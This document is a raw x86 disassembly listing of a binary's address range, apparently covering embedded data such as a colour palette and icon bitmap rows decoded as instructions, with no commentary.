  411606:	add    BYTE PTR [eax],al
  411608:	cdq    
  411609:	xor    eax,DWORD PTR [eax]
  41160b:	add    ah,cl
  41160d:	xor    eax,DWORD PTR [eax]
  41160f:	add    bh,bh
  411611:	xor    eax,DWORD PTR [eax]
  411613:	add    BYTE PTR [eax],al
  411615:	data16 add BYTE PTR [eax],al
  411618:	xor    esp,DWORD PTR [esi+0x0]
  41161b:	add    BYTE PTR [esi+0x66],ah
  41161e:	add    BYTE PTR [eax],al
  411620:	cdq    
  411621:	data16 add BYTE PTR [eax],al
  411624:	int3   
  411625:	data16 add BYTE PTR [eax],al
  411628:	jmp    DWORD PTR [esi+0x0]
  41162b:	add    BYTE PTR [eax],al
  41162d:	cdq    
  41162e:	add    BYTE PTR [eax],al
  411630:	xor    ebx,DWORD PTR [ecx-0x669a0000]
  411636:	add    BYTE PTR [eax],al
  411638:	cdq    
  411639:	cdq    
  41163a:	add    BYTE PTR [eax],al
  41163c:	int3   
  41163d:	cdq    
  41163e:	add    BYTE PTR [eax],al
  411640:	call   FWORD PTR [ecx-0x34000000]
  411646:	add    BYTE PTR [eax],al
  411648:	xor    ecx,esp
  41164a:	add    BYTE PTR [eax],al
  41164c:	data16 int3 
  41164e:	add    BYTE PTR [eax],al
  411650:	cdq    
  411651:	int3   
  411652:	add    BYTE PTR [eax],al
  411654:	int3   
  411655:	int3   
  411656:	add    BYTE PTR [eax],al
  411658:	dec    esp
  41165a:	add    BYTE PTR [eax],al
  41165c:	inc    WORD PTR [eax]
  41165f:	add    BYTE PTR [ecx-0x33ffff01],bl
  411665:	inc    DWORD PTR [eax]
  411667:	add    BYTE PTR [eax],al
  411669:	add    BYTE PTR [ebx],dh
  41166b:	add    BYTE PTR [ebx],dh
  41166d:	add    BYTE PTR [ebx],dh
  41166f:	add    BYTE PTR [esi+0x0],ah
  411672:	xor    eax,DWORD PTR [eax]
  411674:	cdq    
  411675:	add    BYTE PTR [ebx],dh
  411677:	add    ah,cl
  411679:	add    BYTE PTR [ebx],dh
  41167b:	add    bh,bh
  41167d:	add    BYTE PTR [ebx],dh
  41167f:	add    BYTE PTR [eax],al
  411681:	xor    esi,DWORD PTR [ebx]
  411683:	add    BYTE PTR [ebx],dh
  411685:	xor    esi,DWORD PTR [ebx]
  411687:	add    BYTE PTR [esi+0x33],ah
  41168a:	xor    eax,DWORD PTR [eax]
  41168c:	cdq    
  41168d:	xor    esi,DWORD PTR [ebx]
  41168f:	add    ah,cl
  411691:	xor    esi,DWORD PTR [ebx]
  411693:	add    bh,bh
  411695:	xor    esi,DWORD PTR [ebx]
  411697:	add    BYTE PTR [eax],al
  411699:	xor    ax,WORD PTR [eax]
  41169c:	xor    esp,DWORD PTR [esi+0x33]
  41169f:	add    BYTE PTR [esi+0x66],ah
  4116a2:	xor    eax,DWORD PTR [eax]
  4116a4:	cdq    
  4116a5:	xor    ax,WORD PTR [eax]
  4116a8:	int3   
  4116a9:	xor    ax,WORD PTR [eax]
  4116ac:	jmp    DWORD PTR [esi+0x33]
  4116af:	add    BYTE PTR [eax],al
  4116b1:	cdq    
  4116b2:	xor    eax,DWORD PTR [eax]
  4116b4:	xor    ebx,DWORD PTR [ecx-0x6699ffcd]
  4116ba:	xor    eax,DWORD PTR [eax]
  4116bc:	cdq    
  4116bd:	cdq    
  4116be:	xor    eax,DWORD PTR [eax]
  4116c0:	int3   
  4116c1:	cdq    
  4116c2:	xor    eax,DWORD PTR [eax]
  4116c4:	call   FWORD PTR [ecx-0x33ffffcd]
  4116ca:	xor    eax,DWORD PTR [eax]
  4116cc:	xor    ecx,esp
  4116ce:	xor    eax,DWORD PTR [eax]
  4116d0:	data16 int3 
  4116d2:	xor    eax,DWORD PTR [eax]
  4116d4:	cdq    
  4116d5:	int3   
  4116d6:	xor    eax,DWORD PTR [eax]
  4116d8:	int3   
  4116d9:	int3   
  4116da:	xor    eax,DWORD PTR [eax]
  4116dc:	dec    esp
  4116de:	xor    eax,DWORD PTR [eax]
  4116e0:	xor    edi,edi
  4116e2:	xor    eax,DWORD PTR [eax]
  4116e4:	push   WORD PTR [ebx]
  4116e7:	add    BYTE PTR [ecx-0x33ffcc01],bl
  4116ed:	push   DWORD PTR [ebx]
  4116ef:	add    bh,bh
  4116f1:	push   DWORD PTR [ebx]
  4116f3:	add    BYTE PTR [eax],al
  4116f5:	add    BYTE PTR [esi+0x0],ah
  4116f8:	xor    eax,DWORD PTR [eax]
  4116fa:	data16 add BYTE PTR [esi+0x0],ah
  4116fe:	data16 add BYTE PTR [ecx-0x33ff9a00],bl
  411705:	add    BYTE PTR [esi+0x0],ah
  411708:	inc    DWORD PTR [eax]
  41170a:	data16 add BYTE PTR [eax],al
  41170d:	xor    esp,DWORD PTR [esi+0x0]
  411710:	xor    esi,DWORD PTR [ebx]
  411712:	data16 add BYTE PTR [esi+0x33],ah
  411716:	data16 add BYTE PTR [ecx-0x33ff99cd],bl
  41171d:	xor    esp,DWORD PTR [esi+0x0]
  411720:	push   DWORD PTR [ebx]
  411722:	data16 add BYTE PTR [eax],al
  411725:	data16 data16 add BYTE PTR [ebx],dh
  411729:	data16 data16 add BYTE PTR [esi+0x66],ah
  41172e:	data16 add BYTE PTR [ecx-0x33ff999a],bl
  411735:	data16 data16 add BYTE PTR [eax],al
  411739:	cdq    
  41173a:	data16 add BYTE PTR [ebx],dh
  41173d:	cdq    
  41173e:	data16 add BYTE PTR [esi-0x67],ah
  411742:	data16 add BYTE PTR [ecx-0x33ff9967],bl
  411749:	cdq    
  41174a:	data16 add bh,bh
  41174d:	cdq    
  41174e:	data16 add BYTE PTR [eax],al
  411751:	int3   
  411752:	data16 add BYTE PTR [ebx],dh
  411755:	int3   
  411756:	data16 add BYTE PTR [ecx-0x33ff9934],bl
  41175d:	int3   
  41175e:	data16 add bh,bh
  411761:	int3   
  411762:	data16 add BYTE PTR [eax],al
  411765:	jmp    DWORD PTR [esi+0x0]
  411768:	xor    edi,edi
  41176a:	data16 add BYTE PTR [ecx-0x33ff9901],bl
  411771:	jmp    DWORD PTR [esi+0x0]
  411774:	inc    DWORD PTR [eax]
  411776:	int3   
  411777:	add    ah,cl
  411779:	add    bh,bh
  41177b:	add    BYTE PTR [eax],al
  41177d:	cdq    
  41177e:	cdq    
  41177f:	add    BYTE PTR [ecx-0x66ff66cd],bl
  411785:	add    BYTE PTR [ecx-0x66ff3400],bl
  41178b:	add    BYTE PTR [eax],al
  41178d:	add    BYTE PTR [ecx-0x66cccd00],bl
  411793:	add    BYTE PTR [esi+0x0],ah
  411796:	cdq    
  411797:	add    ah,cl
  411799:	xor    ebx,DWORD PTR [ecx-0x66ff0100]
  41179f:	add    BYTE PTR [eax],al
  4117a1:	cwd    
  4117a3:	add    BYTE PTR [ebx],dh
  4117a5:	cwd    
  4117a7:	add    BYTE PTR [esi+0x33],ah
  4117aa:	cdq    
  4117ab:	add    BYTE PTR [ecx-0x33ff669a],bl
  4117b1:	cwd    
  4117b3:	add    bh,bh
  4117b5:	xor    ebx,DWORD PTR [ecx-0x6666cd00]
  4117bb:	add    BYTE PTR [esi-0x67],ah
  4117be:	cdq    
  4117bf:	add    BYTE PTR [ecx-0x33ff6667],bl
  4117c5:	cdq    
  4117c6:	cdq    
  4117c7:	add    bh,bh
  4117c9:	cdq    
  4117ca:	cdq    
  4117cb:	add    BYTE PTR [eax],al
  4117cd:	int3   
  4117ce:	cdq    
  4117cf:	add    BYTE PTR [ebx],dh
  4117d1:	int3   
  4117d2:	cdq    
  4117d3:	add    BYTE PTR [esi-0x34],ah
  4117d6:	data16 add BYTE PTR [ecx-0x33ff6634],bl
  4117dd:	int3   
  4117de:	cdq    
  4117df:	add    bh,bh
  4117e1:	int3   
  4117e2:	cdq    
  4117e3:	add    BYTE PTR [eax],al
  4117e5:	call   FWORD PTR [ecx-0x6600cd00]
  4117eb:	add    BYTE PTR [esi-0x34],ah
  4117ee:	cdq    
  4117ef:	add    BYTE PTR [ecx-0x33ff6601],bl
  4117f5:	call   FWORD PTR [ecx-0x66000100]
  4117fb:	add    BYTE PTR [eax],al
  4117fd:	add    ah,cl
  4117ff:	add    BYTE PTR [ebx],dh
  411801:	add    BYTE PTR [ecx-0x33ff9a00],bl
  411807:	add    BYTE PTR [ecx-0x33ff3400],bl
  41180d:	add    ah,cl
  41180f:	add    BYTE PTR [eax],al
  411811:	xor    ebx,DWORD PTR [ecx-0x33cccd00]
  411817:	add    BYTE PTR [esi+0x33],ah
  41181a:	int3   
  41181b:	add    BYTE PTR [ecx-0x33ff33cd],bl
  411821:	xor    ecx,esp
  411823:	add    bh,bh
  411825:	xor    ecx,esp
  411827:	add    BYTE PTR [eax],al
  411829:	data16 int3 
  41182b:	add    BYTE PTR [ebx],dh
  41182d:	data16 int3 
  41182f:	add    BYTE PTR [esi+0x66],ah
  411832:	cdq    
  411833:	add    BYTE PTR [ecx-0x33ff339a],bl
  411839:	data16 int3 
  41183b:	add    bh,bh
  41183d:	cwd    
  41183f:	add    BYTE PTR [eax],al
  411841:	cdq    
  411842:	int3   
  411843:	add    BYTE PTR [ebx],dh
  411845:	cdq    
  411846:	int3   
  411847:	add    BYTE PTR [esi-0x67],ah
  41184a:	int3   
  41184b:	add    BYTE PTR [ecx-0x33ff3367],bl
  411851:	cdq    
  411852:	int3   
  411853:	add    bh,bh
  411855:	cdq    
  411856:	int3   
  411857:	add    BYTE PTR [eax],al
  411859:	int3   
  41185a:	int3   
  41185b:	add    BYTE PTR [ebx],dh
  41185d:	int3   
  41185e:	int3   
  41185f:	add    BYTE PTR [esi-0x34],ah
  411862:	int3   
  411863:	add    BYTE PTR [ecx-0x33ff3334],bl
  411869:	int3   
  41186a:	int3   
  41186b:	add    bh,bh
  41186d:	int3   
  41186e:	int3   
  41186f:	add    BYTE PTR [eax],al
  411871:	dec    esp
  411873:	add    BYTE PTR [ebx],dh
  411875:	dec    esp
  411877:	add    BYTE PTR [esi-0x1],ah
  41187a:	cdq    
  41187b:	add    BYTE PTR [ecx-0x33ff3301],bl
  411881:	dec    esp
  411883:	add    bh,bh
  411885:	dec    esp
  411887:	add    BYTE PTR [ebx],dh
  411889:	add    ah,cl
  41188b:	add    BYTE PTR [esi+0x0],ah
  41188e:	inc    DWORD PTR [eax]
  411890:	cdq    
  411891:	add    bh,bh
  411893:	add    BYTE PTR [eax],al
  411895:	xor    ecx,esp
  411897:	add    BYTE PTR [ebx],dh
  411899:	xor    edi,edi
  41189b:	add    BYTE PTR [esi+0x33],ah
  41189e:	inc    DWORD PTR [eax]
  4118a0:	cdq    
  4118a1:	xor    edi,edi
  4118a3:	add    ah,cl
  4118a5:	xor    edi,edi
  4118a7:	add    bh,bh
  4118a9:	xor    edi,edi
  4118ab:	add    BYTE PTR [eax],al
  4118ad:	inc    WORD PTR [eax]
  4118b0:	xor    esp,DWORD PTR [esi-0x1]
  4118b3:	add    BYTE PTR [esi+0x66],ah
  4118b6:	int3   
  4118b7:	add    BYTE PTR [ecx-0x33ff009a],bl
  4118bd:	inc    WORD PTR [eax]
  4118c0:	jmp    DWORD PTR [esi-0x34]
  4118c3:	add    BYTE PTR [eax],al
  4118c5:	cdq    
  4118c6:	inc    DWORD PTR [eax]
  4118c8:	xor    ebx,DWORD PTR [ecx-0x6699ff01]
  4118ce:	inc    DWORD PTR [eax]
  4118d0:	cdq    
  4118d1:	cdq    
  4118d2:	inc    DWORD PTR [eax]
  4118d4:	int3   
  4118d5:	cdq    
  4118d6:	inc    DWORD PTR [eax]
  4118d8:	call   FWORD PTR [ecx-0x33ffff01]
  4118de:	inc    DWORD PTR [eax]
  4118e0:	xor    ecx,esp
  4118e2:	inc    DWORD PTR [eax]
  4118e4:	data16 int3 
  4118e6:	inc    DWORD PTR [eax]
  4118e8:	cdq    
  4118e9:	int3   
  4118ea:	inc    DWORD PTR [eax]
  4118ec:	int3   
  4118ed:	int3   
  4118ee:	inc    DWORD PTR [eax]
  4118f0:	dec    esp
  4118f2:	inc    DWORD PTR [eax]
  4118f4:	xor    edi,edi
  4118f6:	inc    DWORD PTR [eax]
  4118f8:	dec    sp
  4118fb:	add    BYTE PTR [ecx-0x33ff0001],bl
  411901:	(bad)  
  411902:	inc    DWORD PTR [eax]
  411904:	jmp    DWORD PTR [esi+0x66]
  411907:	add    BYTE PTR [esi-0x1],ah
  41190a:	data16 add bh,bh
  41190d:	jmp    DWORD PTR [esi+0x0]
  411910:	data16 inc WORD PTR [eax]
  411914:	jmp    DWORD PTR [esi-0x1]
  411917:	add    BYTE PTR [esi-0x1],ah
  41191a:	inc    DWORD PTR [eax]
  41191c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41191d:	add    BYTE PTR [ecx],ah
  41191f:	add    BYTE PTR [edi+0x5f],bl
  411922:	pop    edi
  411923:	add    BYTE PTR [edi+0x77],dh
  411926:	ja     0x411928
  411928:	xchg   BYTE PTR [esi-0x6969ff7a],al
  41192e:	xchg   esi,eax
  41192f:	add    bl,cl
  411931:	retf   
  411932:	retf   
  411933:	add    BYTE PTR [edx-0x28ff4d4e],dh
  411939:	xlat   BYTE PTR ds:[ebx]
  41193a:	xlat   BYTE PTR ds:[ebx]
  41193b:	add    ch,bl
  41193d:	fstp   st(5)
  41193f:	add    bl,ah
  411941:	jecxz  0x411926
  411943:	add    dl,ch
  411945:	jmp    0xf1:0xf1f100ea
  41194c:	clc    
  41194d:	clc    
  41194e:	clc    
  41194f:	add    bh,bh
  411951:	sti    
  411952:	lock add BYTE PTR [eax-0x7fff5b60],ah
  411959:	add    BYTE PTR [eax+0xff00],0x0
  411960:	add    bh,bh
  411962:	add    BYTE PTR [eax],al
  411964:	(bad)  
  411965:	inc    DWORD PTR [eax]
  411967:	add    BYTE PTR [eax],al
  411969:	add    bh,bh
  41196b:	add    bh,bh
  41196d:	add    bh,bh
  41196f:	add    BYTE PTR [eax],al
  411971:	(bad)  
  411972:	inc    DWORD PTR [eax]
  411974:	(bad)  
  411975:	(bad)  
  411976:	inc    DWORD PTR [eax]
	...
  411984:	add    BYTE PTR [eax],al
  411986:	add    dl,ch
  411988:	jmp    0x0:0x434343ea
	...
  4119a3:	add    BYTE PTR [eax],al
  4119a5:	jmp    0x58c2:0xe1bbbbea
  4119ac:	xor    DWORD PTR [ebx+0x43],eax
	...
  4119b7:	add    BYTE PTR [eax],al
  4119b9:	add    ah,ch
  4119bb:	mov    esp,0xffbcff
  4119c0:	add    BYTE PTR [eax],al
  4119c2:	add    BYTE PTR [eax],al
  4119c4:	jmp    0xc2e1:0xbbbb0707
  4119cb:	pop    eax
  4119cc:	xor    DWORD PTR [eax],esi
  4119ce:	lahf   
  4119cf:	inc    ebx
	...
  4119d8:	add    BYTE PTR [eax],al
  4119da:	in     al,dx
  4119db:	(bad)  
  4119dc:	mov    esp,0xec00bcff
  4119e1:	add    BYTE PTR [eax],al
  4119e3:	jmp    0xe1bb:0x70707ef
  4119ea:	pop    eax
  4119eb:	xor    DWORD PTR [eax],esi
  4119ed:	lahf   
  4119ee:	lahf   
  4119ef:	lahf   
  4119f0:	inc    ebx
	...
  4119f9:	add    ah,ch
  4119fb:	mov    esp,0xffbcff
  411a00:	imul   esp
  411a02:	add    bl,ch
  411a04:	out    dx,eax
  411a05:	out    dx,eax
  411a06:	pop    es
  411a07:	pop    es
  411a08:	mov    ebx,0x9f3031e1
  411a0d:	lahf   
  411a0e:	repnz repnz inc ebx
	...
  411a19:	add    ah,ch
  411a1b:	(bad)  
  411a1c:	mov    esp,0xec00bcff
  411a21:	imul   edx
  411a23:	out    dx,eax
  411a24:	out    dx,eax
  411a25:	out    dx,eax
  411a26:	out    dx,eax
  411a27:	pop    es
  411a28:	mov    ebx,0xf29f30bb
  411a2d:	repnz repnz repnz repnz inc ebx
	...
  411a3a:	in     al,dx
  411a3b:	mov    esp,0xffbcff
  411a40:	imul   esp
  411a42:	jmp    0x7ef:0xefefefbc
  411a49:	add    BYTE PTR [eax],al
  411a4b:	repnz repnz repnz out dx,eax
  411a4f:	out    dx,eax
  411a50:	out    dx,eax
  411a51:	inc    ebx
	...
  411a5a:	in     al,dx
  411a5b:	(bad)  
  411a5c:	mov    esp,0xec00bcff
  411a61:	imul   edx
  411a63:	mov    esp,0xefefbcbc
  411a68:	add    BYTE PTR [eax],al
  411a6a:	add    BYTE PTR [eax],al
  411a6c:	in     al,dx
  411a6d:	in     al,dx
  411a6e:	in     al,dx
  411a6f:	out    dx,eax
  411a70:	out    dx,eax
  411a71:	inc    ebx
	...
  411a7a:	in     al,dx
  411a7b:	mov    esp,0xffbcff
  411a80:	imul   esp
  411a82:	jmp    0x92:0x92929292
  411a89:	add    BYTE PTR [eax],al
  411a8b:	add    al,dh
  411a8d:	lock in al,dx
  411a8f:	in     al,dx
  411a90:	in     al,dx
  411a91:	inc    ebx
	...
  411a9a:	in     al,dx
  411a9b:	(bad)  
  411a9c:	mov    esp,0xec00bcff
  411aa1:	imul   edx
  411aa3:	repnz repnz lahf 
  411aa6:	lahf   
  411aa7:	pop    eax
  411aa8:	pop    eax
  411aa9:	add    BYTE PTR [eax],al
  411aab:	out    dx,eax
  411aac:	idiv   edi
  411aae:	lock out dx,eax
  411ab0:	out    dx,eax
  411ab1:	inc    ebx
	...
  411aba:	in     al,dx
  411abb:	(bad)  
  411abc:	(bad)  
  411abd:	(bad)  
  411abe:	inc    DWORD PTR [eax]
  411ac0:	imul   esp
  411ac2:	jmp    0x7352:0x58589ff2
  411ac9:	jae    0x411a85
  411acb:	out    dx,eax
  411acc:	test   DWORD PTR [edi],0x43f0f0ff
	...
  411ada:	in     al,dx
  411adb:	(bad)  
  411adc:	(bad)  
  411add:	(bad)  
  411ade:	inc    DWORD PTR [eax]
  411ae0:	in     al,dx
  411ae1:	imul   esp
  411ae3:	jmp    0xe178:0x73525858
  411aea:	mov    edx,0x7f7efef
  411aef:	inc    DWORD PTR [ebx+0x0]
	...
  411afa:	in     al,dx
  411afb:	(bad)  
  411afc:	(bad)  
  411afd:	(bad)  
  411afe:	inc    DWORD PTR [eax]
  411b00:	imul   esp
  411b02:	imul   edx
  411b04:	pop    eax
  411b05:	push   edx
  411b06:	push   edx
  411b07:	jae    0x411aea
  411b09:	loope  0x411ac5
  411b0b:	mov    edx,0x7f7f7ef
  411b10:	inc    ebx
  411b11:	pop    es
  411b12:	pop    es
  411b13:	pop    es
  411b14:	pop    es
  411b15:	pop    es
  411b16:	add    BYTE PTR [eax],al
  411b18:	add    BYTE PTR [eax],al
  411b1a:	in     al,dx
  411b1b:	(bad)  
  411b1c:	(bad)  
  411b1d:	(bad)  
  411b1e:	inc    DWORD PTR [eax]
  411b20:	div    edi
  411b22:	div    edi
  411b24:	jmp    0xbaba:0xe1787352
  411b2b:	mov    edx,0x43f7efef
  411b30:	add    BYTE PTR [eax],al
  411b32:	add    BYTE PTR [eax],al
  411b34:	pop    es
  411b35:	out    dx,eax
  411b36:	in     al,dx
  411b37:	add    BYTE PTR [eax],al
  411b39:	add    ah,ch
  411b3b:	(bad)  
  411b3c:	(bad)  
  411b3d:	(bad)  
  411b3e:	inc    DWORD PTR [eax]
  411b40:	div    edi
  411b42:	div    edi
  411b44:	add    bl,ch
  411b46:	jmp    0x411bc0
  411b48:	loope  0x411b04
  411b4a:	mov    edx,0x4343efba
  411b4f:	in     al,dx
  411b50:	in     al,dx
  411b51:	in     al,dx
  411b52:	in     al,dx
  411b53:	in     al,dx
  411b54:	pop    es
  411b55:	pop    es
  411b56:	in     al,dx
  411b57:	add    BYTE PTR [eax],al
  411b59:	add    ah,ch
  411b5b:	(bad)  
  411b5c:	(bad)  
  411b5d:	(bad)  
  411b5e:	inc    DWORD PTR [eax]
  411b60:	div    edi
  411b62:	div    edi
  411b64:	add    bh,bh
  411b66:	(bad)  
  411b67:	in     eax,dx
  411b68:	in     eax,dx
  411b69:	in     eax,dx
  411b6a:	in     eax,dx
  411b6b:	jmp    0x411b58
  411b6d:	(bad)  
  411b6e:	(bad)  
  411b6f:	(bad)  
  411b70:	(bad)  
  411b71:	(bad)  
  411b72:	(bad)  
  411b73:	(bad)  
  411b74:	(bad)  
  411b75:	(bad)  
  411b76:	in     al,dx
  411b77:	add    BYTE PTR [eax],al
  411b79:	add    ah,ch
  411b7b:	in     al,dx
  411b7c:	in     al,dx
  411b7d:	in     al,dx
  411b7e:	in     al,dx
  411b7f:	add    bh,dh
  411b81:	div    edi
  411b83:	test   DWORD PTR [eax],0xecececec
  411b89:	in     al,dx
  411b8a:	in     al,dx
  411b8b:	in     al,dx
  411b8c:	in     al,dx
  411b8d:	in     al,dx
  411b8e:	in     al,dx
  411b8f:	in     al,dx
  411b90:	in     al,dx
  411b91:	in     al,dx
  411b92:	in     al,dx
  411b93:	in     al,dx
  411b94:	in     al,dx
  411b95:	out    dx,eax
  411b96:	in     al,dx
  411b97:	add    BYTE PTR [eax],al
  411b99:	add    dl,ch
  411b9b:	jmp    0xf7f7:0xeaeaea
  411ba2:	div    edi
	...
  411bb4:	add    BYTE PTR [eax],al
  411bb6:	out    dx,eax
  411bb7:	or     eax,DWORD PTR [eax]
  411bb9:	in     al,dx
  411bba:	(bad)  
  411bbb:	(bad)  
  411bbc:	(bad)  
  411bbd:	(bad)  
  411bbe:	(bad)  
  411bbf:	jmp    0xec00:0xf7f7f700
  411bc6:	pop    es
  411bc7:	pop    es
  411bc8:	pop    es
  411bc9:	pop    es
  411bca:	pop    es
  411bcb:	pop    es
  411bcc:	pop    es
  411bcd:	pop    es
  411bce:	pop    es
  411bcf:	pop    es
  411bd0:	pop    es
  411bd1:	pop    es
  411bd2:	pop    es
  411bd3:	pop    es
  411bd4:	pop    es
  411bd5:	in     al,dx
  411bd6:	add    BYTE PTR [eax],al
  411bd8:	in     al,dx
  411bd9:	in     al,dx
  411bda:	in     al,dx
  411bdb:	in     al,dx
  411bdc:	in     al,dx
  411bdd:	in     al,dx
  411bde:	in     al,dx
  411bdf:	jmp    0xec00:0xf7f700ea
  411be6:	(bad)  
  411be7:	(bad)  
  411be8:	(bad)  
  411be9:	(bad)  
  411bea:	(bad)  
  411beb:	(bad)  
  411bec:	(bad)  
  411bed:	(bad)  
  411bee:	(bad)  
  411bef:	(bad)  
  411bf0:	(bad)  
  411bf1:	(bad)  
  411bf2:	(bad)  
  411bf3:	inc    DWORD PTR [edi]
  411bf5:	in     al,dx
  411bf6:	add    BYTE PTR [eax],al
  411bf8:	add    BYTE PTR [eax],al
  411bfa:	add    BYTE PTR [eax],al
  411bfc:	add    ah,ch
  411bfe:	jmp    0xf7:0xeaeaea
  411c05:	in     al,dx
  411c06:	inc    DWORD PTR [ecx]
  411c08:	add    DWORD PTR [ecx],eax
  411c0a:	add    DWORD PTR [ecx],eax
  411c0c:	add    DWORD PTR [ecx],eax
  411c0e:	add    DWORD PTR [ecx],eax
  411c10:	add    DWORD PTR [ecx],eax
  411c12:	add    edi,edi
  411c14:	pop    es
  411c15:	in     al,dx
	...
  411c1e:	in     al,dx
  411c1f:	jmp    0xec00:0xeaeaea
  411c26:	inc    DWORD PTR [ecx]
  411c28:	sti    
  411c29:	jp     0x411ca5
  411c2b:	xor    DWORD PTR [ecx],esi
  411c2d:	xor    DWORD PTR [ecx],esi
  411c2f:	dec    ebp
  411c30:	dec    ebp
  411c31:	dec    ebp
  411c32:	add    edi,edi
  411c34:	pop    es
  411c35:	in     al,dx
	...
  411c3e:	add    ah,ch
  411c40:	(bad)  
  411c41:	(bad)  
  411c42:	(bad)  
  411c43:	inc    DWORD PTR [eax]
  411c45:	in     al,dx
  411c46:	inc    DWORD PTR [ecx]
  411c48:	ret    
  411c49:	pop    esi
  411c4a:	jp     0x411cc6
  411c4c:	xor    DWORD PTR [ecx],esi
  411c4e:	xor    DWORD PTR [ecx],esi
  411c50:	dec    ebp
  411c51:	dec    ebp
  411c52:	add    edi,edi
  411c54:	pop    es
  411c55:	in     al,dx
	...
  411c5e:	add    BYTE PTR [eax],al
  411c60:	in     al,dx
  411c61:	in     al,dx
  411c62:	in     al,dx
  411c63:	in     al,dx
  411c64:	in     al,dx
  411c65:	add    bh,bh
  411c67:	add    DWORD PTR [esi-0x3d],ebx
  411c6a:	pop    esi
  411c6b:	jp     0x411ce7
  411c6d:	xor    DWORD PTR [ecx],esi
  411c6f:	xor    DWORD PTR [ecx],esi
  411c71:	dec    ebp
  411c72:	add    edi,edi
  411c74:	pop    es
  411c75:	in     al,dx
	...
  411c82:	add    BYTE PTR [eax],al
  411c84:	add    ah,ch
  411c86:	inc    DWORD PTR [ecx]
  411c88:	ret    
  411c89:	pop    esi
  411c8a:	ret    
  411c8b:	pop    esi
  411c8c:	jp     0x411d08
  411c8e:	xor    DWORD PTR [ecx],esi
  411c90:	xor    DWORD PTR [ecx],esi
  411c92:	add    edi,edi
  411c94:	pop    es
  411c95:	in     al,dx
	...
  411ca2:	add    BYTE PTR [eax],al
  411ca4:	add    ah,ch
  411ca6:	inc    DWORD PTR [ecx]
  411ca8:	pop    esi
  411ca9:	ret    
  411caa:	pop    esi
  411cab:	ret    
  411cac:	pop    esi
  411cad:	jp     0x411d29
  411caf:	xor    DWORD PTR [ecx],esi
  411cb1:	xor    DWORD PTR [ecx],eax
  411cb3:	inc    DWORD PTR [edi]
  411cb5:	in     al,dx
	...
  411cc2:	add    BYTE PTR [eax],al
  411cc4:	add    ah,ch
  411cc6:	inc    DWORD PTR [ecx]
  411cc8:	jp     0x411d28
  411cca:	ret    
  411ccb:	pop    esi
  411ccc:	ret    
  411ccd:	pop    esi
  411cce:	jp     0x411d4a
  411cd0:	xor    DWORD PTR [ecx],esi
  411cd2:	add    edi,edi
  411cd4:	pop    es
  411cd5:	in     al,dx
	...
  411ce2:	add    BYTE PTR [eax],al
  411ce4:	add    ah,ch
  411ce6:	inc    DWORD PTR [ecx]
  411ce8:	jp     0x411d64
  411cea:	pop    esi
  411ceb:	ret    
  411cec:	pop    esi
  411ced:	ret    
  411cee:	pop    esi
  411cef:	jp     0x411d6b
  411cf1:	xor    DWORD PTR [ecx],eax
  411cf3:	inc    DWORD PTR [edi]
  411cf5:	in     al,dx
	...
  411d02:	add    BYTE PTR [eax],al
  411d04:	add    ah,ch
  411d06:	inc    DWORD PTR [ecx]
  411d08:	jp     0x411d84
  411d0a:	jp     0x411d6a
  411d0c:	ret    
  411d0d:	pop    esi
  411d0e:	ret    
  411d0f:	sti    
  411d10:	jp     0x411d8c
  411d12:	add    edi,edi
  411d14:	pop    es
  411d15:	in     al,dx
	...
  411d22:	add    BYTE PTR [eax],al
  411d24:	add    ah,ch
  411d26:	inc    DWORD PTR [ecx]
  411d28:	add    DWORD PTR [ecx],eax
  411d2a:	add    DWORD PTR [ecx],eax
  411d2c:	add    DWORD PTR [ecx],eax
  411d2e:	add    DWORD PTR [ecx],eax
  411d30:	add    DWORD PTR [ecx],eax
  411d32:	add    edi,edi
  411d34:	pop    es
  411d35:	in     al,dx
	...
  411d42:	add    BYTE PTR [eax],al
  411d44:	add    ah,ch
  411d46:	(bad)  
  411d47:	(bad)  
  411d48:	(bad)  
  411d49:	(bad)  
  411d4a:	(bad)  
  411d4b:	(bad)  
  411d4c:	(bad)  
  411d4d:	(bad)  
  411d4e:	(bad)  
  411d4f:	(bad)  
  411d50:	(bad)  
  411d51:	(bad)  
  411d52:	(bad)  
  411d53:	inc    DWORD PTR [edi]
  411d55:	in     al,dx
	...
  411d66:	jmp    0x411d53
  411d68:	jmp    0x411d55
  411d6a:	jmp    0x411d57
  411d6c:	jmp    0x411d59
  411d6e:	jmp    0x411d5b
  411d70:	jmp    0x411d5d
  411d72:	jmp    0x411d5f
  411d74:	jmp    0x411d61
  411d76:	add    BYTE PTR [eax],al
  411d78:	(bad)  
  411d79:	inc    BYTE PTR [edi]
  411d7b:	inc    eax
  411d7d:	clc    
  411d7e:	add    edi,edi
  411d80:	shl    BYTE PTR [eax+0x0],0xff
  411d84:	shl    BYTE PTR [eax],0x0
  411d87:	jg     0x411d49
  411d89:	add    BYTE PTR [eax],al
  411d8b:	jg     0x411d4d
  411d8d:	add    BYTE PTR [eax],al
  411d8f:	aas    
  411d90:	rol    BYTE PTR [eax],0x0
  411d93:	aas    
  411d94:	rol    BYTE PTR [eax],0x60
  411d97:	aas    
  411d98:	rol    BYTE PTR [eax],0x60
  411d9b:	aas    
  411d9c:	rol    BYTE PTR [eax],0x0
  411d9f:	aas    
  411da0:	rol    BYTE PTR [eax],0x0
  411da3:	aas    
  411da4:	rol    BYTE PTR [eax],0x0
  411da7:	add    eax,eax
  411da9:	add    BYTE PTR [eax],al
  411dab:	add    eax,eax
  411dad:	add    BYTE PTR [eax],al
  411daf:	add    al,al
  411db1:	add    BYTE PTR [eax],al
  411db3:	add    al,al
  411db5:	add    BYTE PTR [eax],al
  411db7:	add    al,al
  411db9:	add    BYTE PTR [eax],al
  411dbb:	add    al,al
  411dbd:	add    BYTE PTR [eax],al
  411dbf:	add    BYTE PTR [eax+0x10000],al
  411dc5:	add    BYTE PTR [eax],al
  411dc7:	add    eax,edi
  411dc9:	add    BYTE PTR [eax],al
  411dcb:	add    esp,edi
  411dcd:	add    BYTE PTR [eax],al
  411dcf:	add    esi,edi
  411dd1:	add    BYTE PTR [eax],al
  411dd3:	add    edi,edi
  411dd5:	add    BYTE PTR [eax],al
  411dd7:	add    edi,edi
  411dd9:	clc    
  411dda:	add    BYTE PTR [ecx],al
  411ddc:	(bad)  
  411ddd:	clc    
  411dde:	add    BYTE PTR [ecx],al
  411de0:	(bad)  
  411de1:	clc    
  411de2:	add    BYTE PTR [ecx],al
  411de4:	(bad)  
  411de5:	clc    
  411de6:	add    BYTE PTR [ecx],al
  411de8:	(bad)  
  411de9:	clc    
  411dea:	add    BYTE PTR [ecx],al
